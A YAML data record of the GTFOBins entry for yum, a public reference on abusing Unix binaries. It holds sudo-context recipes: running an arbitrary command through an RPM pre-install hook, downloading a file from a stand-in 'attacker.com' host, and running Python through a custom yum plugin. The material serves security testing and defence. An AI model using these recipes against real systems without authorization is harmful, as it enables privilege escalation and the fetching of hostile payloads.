source_data:
  GTFOBins:
    raw:
      documents:
        yum:
          functions:
            command:
            - code: yum localinstall -y x-1.0-1.noarch.rpm
              comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload
                it to the target.


                ```

                echo /path/to/command >x.sh

                fpm -n x -s dir -t rpm -a all --before-install .x.sh .

                ```'
              contexts:
                sudo: null
            download:
            - code: yum install http://attacker.com/path/to/input-file.rpm
              comment: The file on the remote host must have the `.rpm` extension, but the content does
                not have to be an RPM file. The file will be downloaded to a randomly created directory
                in `/var/tmp/yum-root-xxxxxx/`.
              contexts:
                sudo: null
              sender: http-server
            inherit:
            - code: "cat >/path/to/temp-dir/x<<EOF\n[main]\nplugins=1\npluginpath=/path/to/temp-dir/\n\
                pluginconfpath=/path/to/temp-dir/\nEOF\n\ncat >/path/to/temp-dir/y.conf<<EOF\n[main]\n\
                enabled=1\nEOF\n\ncat >/path/to/temp-dir/y.py<<EOF\nimport yum\nfrom yum.plugins import\
                \ PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n\
                \  ...\nEOF\n\nyum -c /path/to/temp-dir/x --enableplugin=y"
              comment: This allows to run Python code (`...`).
              contexts:
                sudo: null
              from: python
